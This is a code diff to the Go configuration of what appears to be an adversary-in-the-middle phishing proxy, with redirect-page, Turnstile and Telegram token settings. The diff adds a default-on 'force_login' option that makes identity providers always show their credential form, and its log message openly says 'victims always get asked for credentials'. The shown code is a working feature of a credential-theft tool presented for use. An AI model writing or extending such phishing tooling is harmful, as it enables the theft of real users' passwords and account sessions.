@@ -69,11 +69,11 @@ type RedirectPage struct {
 	TargetURL string `mapstructure:"target_url" json:"target_url" yaml:"target_url"`
 	Turnstile bool   `mapstructure:"turnstile" json:"turnstile" yaml:"turnstile"`
 	// Turnstile presentation (optional)
-	TurnstilePos   string `mapstructure:"turnstile_pos" json:"turnstile_pos" yaml:"turnstile_pos"`     // slot|inline|overlay|center|bottom|corner
-	TurnstileType  string `mapstructure:"turnstile_type" json:"turnstile_type" yaml:"turnstile_type"`  // managed|non-interactive|invisible
+	TurnstilePos   string `mapstructure:"turnstile_pos" json:"turnstile_pos" yaml:"turnstile_pos"`       // slot|inline|overlay|center|bottom|corner
+	TurnstileType  string `mapstructure:"turnstile_type" json:"turnstile_type" yaml:"turnstile_type"`    // managed|non-interactive|invisible
 	TurnstileTheme string `mapstructure:"turnstile_theme" json:"turnstile_theme" yaml:"turnstile_theme"` // light|dark|auto
-	Delay          int    `mapstructure:"delay" json:"delay" yaml:"delay"`                             // seconds before redirect
-	Template       string `mapstructure:"template" json:"template" yaml:"template"`                    // source template slug
+	Delay          int    `mapstructure:"delay" json:"delay" yaml:"delay"`                               // seconds before redirect
+	Template       string `mapstructure:"template" json:"template" yaml:"template"`                      // source template slug
 	// Per-page branding overrides (empty = use the template default)
 	Brand    string   `mapstructure:"brand" json:"brand" yaml:"brand"`
 	Title    string   `mapstructure:"title" json:"title" yaml:"title"`
@@ -120,6 +120,7 @@ type GeneralConfig struct {
 	Chatid             string `mapstructure:"chatid" json:"chatid" yaml:"chatid"`
 	Teletoken          string `mapstructure:"teletoken" json:"teletoken" yaml:"teletoken"`
 	StripHeaders       bool   `mapstructure:"strip_headers" json:"strip_headers" yaml:"strip_headers"`
+	ForceLogin         bool   `mapstructure:"force_login" json:"force_login" yaml:"force_login"`
 	UnauthRedirect     bool   `mapstructure:"unauth_redirect" json:"unauth_redirect" yaml:"unauth_redirect"`
 	DashboardSubdomain string `mapstructure:"dashboard_sub" json:"dashboard_sub" yaml:"dashboard_sub"`
 	DashboardUser      string `mapstructure:"dashboard_user" json:"dashboard_user" yaml:"dashboard_user"`
@@ -207,6 +208,10 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	if c.cfg.Get("general.strip_headers") == nil {
 		c.cfg.Set("general.strip_headers", true)
 		c.general.StripHeaders = true
+	}
+	if c.cfg.Get("general.force_login") == nil {
+		c.cfg.Set("general.force_login", true)
+		c.general.ForceLogin = true
 	}
 
 	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)
@@ -1021,6 +1026,24 @@ func (c *Config) SetStripHeaders(enabled bool) {
 
 func (c *Config) IsStripHeadersEnabled() bool {
 	return c.general.StripHeaders
+}
+
+// SetForceLogin toggles forcing the identity provider to show the credential
+// form (prompt=login / wfresh=0) instead of silently re-authenticating a session
+// the browser already has.
+func (c *Config) SetForceLogin(enabled bool) {
+	c.general.ForceLogin = enabled
+	c.cfg.Set(CFG_GENERAL, c.general)
+	if enabled {
+		log.Info("force login enabled - victims always get asked for credentials")
+	} else {
+		log.Info("force login disabled")
+	}
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) IsForceLoginEnabled() bool {
+	return c.general.ForceLogin
 }
 
 func (c *Config) GetStripHeadersStatus() string {
